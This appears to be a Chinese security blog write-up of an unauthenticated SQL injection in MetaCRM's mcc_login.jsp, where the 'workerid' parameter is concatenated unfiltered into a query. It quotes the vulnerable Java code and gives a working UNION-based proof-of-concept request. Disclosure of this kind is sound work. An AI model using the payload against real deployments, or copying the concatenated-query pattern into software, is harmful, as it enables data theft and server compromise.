---
title: "美特CRM mcc_login.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/metasoft-mcc_login-workerid-sqli.html
asset_dir: assets/美特crm-mcc_login.jsp-sql注入漏洞
---

# 美特CRM mcc\_login.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/22 23:33
- 2093浏览
- [0评论](#comment)
- 21分钟阅读

深入探索

计算机安全

安全工具开发

恶意软件分析工具

---

# 漏洞简介

MetaCRM是一款智能平台化CRM软件,通过提升企业管理和协同办公,全面提高企业管理水平和运营效率,帮助企业实现卓越管理。美特软件开创性地在CRM领域中引入用户级产品平台MetaCRM V5/V6，多年来一直在持续地为客户创造价值，大幅提升了用户需求满足度与使用的满意度。针对成长型企业，美特软件用先进的CRM产品与技术，开发了适合中小型企业的产品“美客宝”，以及面向云计算的在线CRM系统。

美特CRM si/callcenter/solarun/mcc\_login.jsp 接口存在[SQL注入漏洞](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入恶意文件，进一步获取服务器系统权限。

# 漏洞分析

直接看 `si/callcenter/solarun/mcc_login.jsp` 文件业务逻辑实现相关代码

```
<%
response.setHeader("Pragma", "no-cache");
response.setHeader("Cache-Control", "no-store");
response.setDateHeader("Expires", 0);
String strTitle=com.metasoft.framework.pub.env.PackageCfg.getName()+" loading......";
//
String userlogin=request.getParameter("workerid"); //seat login ID
com.metasoft.framework.db.DBManager dm = new com.metasoft.framework.db.DBManager("default");
org.dom4j.Element el =  dm.findOne("select scode from org_employee where scode ='" + userlogin + "' or sctino='" + userlogin + "';");
userlogin = (String)el.attribute("scode").getData();
String passwd=request.getParameter("passwd"); //seat login password (abc123def)
String rtype=request.getParameter("rtype"); //login type (lgn)
//if ("lgn".equalsIgnoreCase(rtype))
  rtype="call400";
%>
```

`workerid` 通过 `request.getParameter` 获取后直接拼接进SQL语句，然后将SQL语句带入 `com.metasoft.framework.db.DBManager` 的 `findOne` 方法里，跟进看下

```
public Element findOne(String findSql) throws SQLException {
        if (findSql != null && findSql.length() != 0) {
            findSql = this.dbserver.getFunTrimSemicolon(findSql);
            List l = this.find(findSql, 1);
            return l != null && l.size() > 0 ? (Element)l.get(0) : null;
        } else {
            return null;
        }
    }
```

深入探索

编程语言教程

网络安全课程

网络安全培训

`findSql` 经过 `getFunTrimSemicolon` 处理如下

```
public String getFunTrimSemicolon(String strSQL) {
        return strSQL;
    }
```

直接返回，在默认为 mssql 的时候没有任何处理，但对 MySQL 和 Oracle 有重写，也不过是去除多余空格以和分号

[![美特CRM mcc_login.jsp SQL注入漏洞](images/img-001-f1e4f88f1d96.webp)](https://image.mrxn.net/89e822be3fde4d33aa65e78a22643aa1.webp)

最后将 `findSql` 带入 `DBManager` 的 `find` 函数执行，全程无任何过滤处理，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)

深入探索

授权

Web安全课程

Windows安全工具

[![美特CRM mcc_login.jsp SQL注入漏洞](images/img-002-e887f9830635.webp)](https://image.mrxn.net/8490cdec1c9148b98f3d593c78fcfad4.webp)

# 漏洞复现

```
GET /si/callcenter/solarun/mcc_login.jsp?workerid=-1'+UNION+ALL+SELECT+@@VERSION-- HTTP/1.1
Host: metasoft.mrxn.net
```

成功在 username 处回显数据库版本信息

[![美特CRM mcc_login.jsp SQL注入漏洞](images/img-003-51ba22401735.webp)](https://image.mrxn.net/782a5d00e2c4421b8a827e8dacd7b31b.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.漏洞分析](#toc-2-)
- [3.漏洞复现](#toc-3-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
